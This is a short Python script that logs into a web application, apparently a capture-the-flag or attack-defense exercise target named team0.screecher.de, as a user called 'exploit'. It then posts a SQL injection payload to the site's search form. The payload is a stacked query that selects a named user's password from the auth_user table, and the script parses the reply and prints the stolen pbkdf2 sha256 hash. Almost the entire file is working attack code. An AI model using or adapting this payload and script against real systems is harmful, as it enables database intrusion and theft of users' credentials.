import requests

def attack(session):
    # ex'; SELECT password FROM auth_user where username = 'AwesomeUsername
    url = 'https://www.team0.screecher.de/search'
    data = {'user': "ex'; SELECT password FROM auth_user where username = 'AwesomeUsername"}
    response = session.post(url, data)  # auth=('username', 'secret')
    success = response.status_code < 400
    response_text = response.text
    return response_text, success

def parseHtml(page):
    try:
        from BeautifulSoup import BeautifulSoup
    except ImportError:
        from bs4 import BeautifulSoup
    parsed_html = BeautifulSoup(page,"lxml")
    value = parsed_html.find("h4", {"class": "card-title"}).text
    return value

def login(session):
    url = 'https://www.team0.screecher.de/login'
    data = { 'user': 'exploit', 'pwd': '123'}
    response = session.post(url, data) # auth=('username', 'secret')
    success = response.status_code < 400
    response_text = response.text
    return response_text, success

if __name__ == '__main__':
    user_session = requests.session()
    response,success = login(user_session)
    response,success = attack(user_session)
    parsedValue = parseHtml(response)
    print("#pbkdf2 sha256 hash for AwesomeUser: "+str(parsedValue))